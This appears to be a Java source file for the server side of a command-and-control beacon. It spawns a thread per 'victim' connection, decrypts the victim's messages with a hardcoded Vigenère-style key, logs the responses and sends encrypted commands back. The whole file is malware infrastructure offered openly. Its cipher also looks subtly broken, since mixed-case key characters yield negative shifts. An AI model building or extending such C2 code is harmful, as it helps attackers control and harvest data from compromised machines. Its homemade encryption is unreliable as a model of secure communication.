package Servers.Beacon;

import Servers.Duplexer;
import java.io.IOException;

public class BeaconClientHandler implements Runnable{
    private String IPAddress;
    private Duplexer duplexer;
    private BeaconServer beaconServer;
    private String key;

    /**
     * Use this Class to create a new thread to handle each victim connection
     * 
     * @param IPAddress IP address of the client (victim)
     * @param duplexer Pointer to the duplexer so that this thread can receive messages from the victim.
     */
    protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer){
        this.IPAddress = IPAddress;
        this.duplexer = duplexer;
        this.beaconServer = beaconServer;
        this.key = "SuPeRSecReTKey";
    }

    protected void quit(String reason) throws IOException{
        duplexer.close();
    }


    // Method to encrypt the plaintext
    public String encrypt(String plaintext) {
        StringBuilder encryptedText = new StringBuilder();
        int keyIndex = 0;
        int keyLength = key.length();

        for (int i = 0; i < plaintext.length(); i++) {
            char currentChar = plaintext.charAt(i);

            if (Character.isLetter(currentChar)) {
                int shift = key.charAt(keyIndex % keyLength) - 'a';
                if (Character.isLowerCase(currentChar)) {
                    char encryptedChar = (char) (((currentChar - 'a' + shift) % 26) + 'a');
                    encryptedText.append(encryptedChar);
                } else {
                    char encryptedChar = (char) (((currentChar - 'A' + shift) % 26) + 'A');
                    encryptedText.append(encryptedChar);
                }
                keyIndex++;  // Only increment keyIndex if the character is alphabetic
            } else {
                encryptedText.append(currentChar);  // Non-alphabet characters remain unchanged
            }
        }
        return encryptedText.toString();
    }

    // Method to decrypt the ciphertext
    public String decrypt(String ciphertext) {
        StringBuilder decryptedText = new StringBuilder();
        int keyIndex = 0;
        int keyLength = key.length();

        for (int i = 0; i < ciphertext.length(); i++) {
            char currentChar = ciphertext.charAt(i);

            if (Character.isLetter(currentChar)) {
                int shift = key.charAt(keyIndex % keyLength) - 'a';
                if (Character.isLowerCase(currentChar)) {
                    char decryptedChar = (char) (((currentChar - 'a' - shift + 26) % 26) + 'a');
                    decryptedText.append(decryptedChar);
                } else {
                    char decryptedChar = (char) (((currentChar - 'A' - shift + 26) % 26) + 'A');
                    decryptedText.append(decryptedChar);
                }
                keyIndex++;  // Only increment keyIndex if the character is alphabetic
            } else {
                decryptedText.append(currentChar);  // Non-alphabet characters remain unchanged
            }
        }
        return decryptedText.toString();
    }

    /**
     * Use this function to have the thread send a message to the client
     * 
     * @param message Message to be sent
     */
    protected void sendToClient(String message){
        message = encrypt(message);
        duplexer.send(message);
    }

    @Override
    public void run(){
        while(true){
            try{
                String response = duplexer.receive();
                response = decrypt(response);
                beaconServer.addDataToResponsesDictionaries(IPAddress, response);

            } catch (IOException e){
                e.printStackTrace();
            }
            
        }
    }
}
